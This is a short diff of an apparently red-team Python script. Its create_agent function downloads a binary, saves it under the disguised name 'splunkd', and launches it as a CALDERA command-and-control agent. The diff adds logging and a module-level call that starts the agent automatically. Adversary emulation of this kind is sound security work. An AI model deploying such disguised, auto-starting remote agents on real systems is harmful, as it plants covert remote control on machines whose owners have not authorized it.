@@ -27,12 +27,17 @@ def create_agent():
 					if chunk:
 						f.write(chunk)
 		os.chmod("splunkd",0o755)
-		subprocess.Popen([
-			"./splunkd",
-			"-server", CALDERA_URL,
-			"-group", "red",
-			"-v"
-])
+		with open("agent.log", "wb") as log:
+    			subprocess.Popen(
+        		[
+            			"./splunkd",
+            			"-server", CALDERA_URL,
+            			"-group", "red",
+            			"-v"
+        		],
+        		stdout=log,
+        		stderr=log
+    		)
 	except Exception:
 		return False
 		
@@ -240,4 +245,6 @@ def format_steps(data: dict) -> list[dict]:
 		return formatted_steps
 	except Exception:
 		return False
-		
+
+
+create_agent()
